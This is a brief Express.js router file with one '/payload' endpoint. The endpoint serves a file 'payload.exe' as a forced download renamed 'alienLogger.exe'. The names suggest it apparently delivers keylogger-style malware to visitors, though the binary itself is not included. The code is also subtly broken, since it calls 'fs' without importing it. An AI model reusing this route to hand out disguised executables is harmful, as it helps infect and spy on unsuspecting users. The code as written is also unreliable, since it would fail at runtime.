const { Router } = require("express");

const router = Router();

router.get("/payload", (req, res) => {
  res.setHeader("Content-disposition", "attachment; filename=alienLogger.exe");
  res.setHeader("Content-type", "application/x-msdownload");
  let file = fs.createReadStream("dl-content/payload.exe");
  file.pipe(res);
});

module.exports = router;
